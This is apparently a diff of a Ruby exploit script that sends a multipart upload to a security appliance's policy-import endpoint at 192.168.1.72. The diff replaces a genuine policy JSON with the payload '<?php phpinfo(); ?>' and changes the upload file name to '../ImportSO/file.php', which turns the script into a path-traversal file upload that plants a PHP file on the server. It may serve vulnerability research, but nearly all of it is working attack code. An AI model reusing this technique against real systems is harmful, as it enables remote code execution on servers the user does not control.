@@ -14,7 +14,7 @@ end
 
 require 'securerandom'
 
-policy = "{\"policy\":[{\"id\":\"1\",\"policyTemplateVersion\":\"1.15\",\"policyName\":\"deadbeeftest\",\"policyVersion\":\"1\",\"productID\":\"154.2\",\"settings\":\"{\"data\":[{\"wcomponent_name\":\"comDDIDenyAllowList\",\"wcomponent_version\":\"1.2\",\"wcomponent_order\":1,\"settings\":{\"list\":{\"denylist\":\"q1bKLFCyio7VUUrLzEmFsEqLciCMlPzcxMw8ELsWAA==\",\"allowlist\":\"i44FAA==\"}}},{\"wcomponent_name\":\"comDDIMonitoredNetwork\",\"wcomponent_version\":\"1.5\",\"wcomponent_order\":2,\"settings\":{\"groupLists\":[{\"groupname\":\"Default\",\"grouplabel\":\"monitored_ip_1\",\"ip_zones\":[{\"value\":\"10.0.0.0-10.255.255.255\",\"option\":\"1\"},{\"value\":\"172.16.0.0-172.31.255.255\",\"option\":\"1\"},{\"value\":\"192.168.0.0-192.168.255.255\",\"option\":\"1\"}],\"parent\":\"\",\"children\":[]}]}},{\"wcomponent_name\":\"comDDIRegisteredServices\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":3,\"settings\":{\"serviceList_info\":[{\"Service\":\"ftp\",\"ipaddress\":\"192.168.1.74\",\"servername\":\"testing\"}]}},{\"wcomponent_name\":\"comDDIDtasSetting\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":4,\"settings\":{\"enable\":0,\"analysis_module\":\"external\",\"vitrual_analyzer\":\"\",\"api_key\":\"\",\"network_type\":\"\",\"sandbox_port\":\"\",\"configure\":\"dhcp\",\"enable_suspicious_files\":\"1\",\"max_size\":\"15\",\"grid\":1}}]}\",\"activatedSettings\":\"{\"data\":[{\"wcomponent_name\":\"comDDIDenyAllowList\",\"wcomponent_version\":\"1.2\",\"wcomponent_order\":1,\"settings\":{\"list\":{\"denylist\":\"q1bKLFCyio7VUUrLzEmFsEqLciCMlPzcxMw8ELsWAA==\",\"allowlist\":\"i44FAA==\"}}},{\"wcomponent_name\":\"comDDIMonitoredNetwork\",\"wcomponent_version\":\"1.5\",\"wcomponent_order\":2,\"settings\":{\"groupLists\":[{\"groupname\":\"Default\",\"grouplabel\":\"monitored_ip_1\",\"ip_zones\":[{\"value\":\"10.0.0.0-10.255.255.255\",\"option\":\"1\"},{\"value\":\"172.16.0.0-172.31.255.255\",\"option\":\"1\"},{\"value\":\"192.168.0.0-192.168.255.255\",\"option\":\"1\"}],\"parent\":\"\",\"children\":[]}]}},{\"wcomponent_name\":\"comDDIRegisteredServices\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":3,\"settings\":{\"serviceList_info\":[{\"Service\":\"ftp\",\"ipaddress\":\"192.168.1.74\",\"servername\":\"testing\"}]}},{\"wcomponent_name\":\"comDDIDtasSetting\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":4,\"settings\":{\"enable\":0,\"analysis_module\":\"external\",\"vitrual_analyzer\":\"\",\"api_key\":\"\",\"network_type\":\"\",\"sandbox_port\":\"\",\"configure\":\"dhcp\",\"enable_suspicious_files\":\"1\",\"max_size\":\"15\",\"grid\":1}}]}\",\"managedSettings\":\"\",\"repeatCycleInMins\":\"1440\"}]}"
+policy = "<?php phpinfo(); ?>"
 
 uri = URI.parse("https://192.168.1.72/")
 boundary = SecureRandom.hex
@@ -46,7 +46,7 @@ post_body << "Content-Disposition: form-data; name=\"fileSize\"\r\n\r\n"
 post_body << "2097152\r\n"
 post_body << "--#{boundary}\r\n"
 post_body << "Content-Disposition: form-data; name=\"fileName\"\r\n\r\n"
-post_body << "../ImportSO/file.txt\r\n"
+post_body << "../ImportSO/file.php\r\n"
 post_body << "--#{boundary}\r\n"
 post_body << "Content-Disposition: form-data; name=\"filename\";\r\n"
 post_body << "filename=\"policy.cmpolicy\"\r\n"
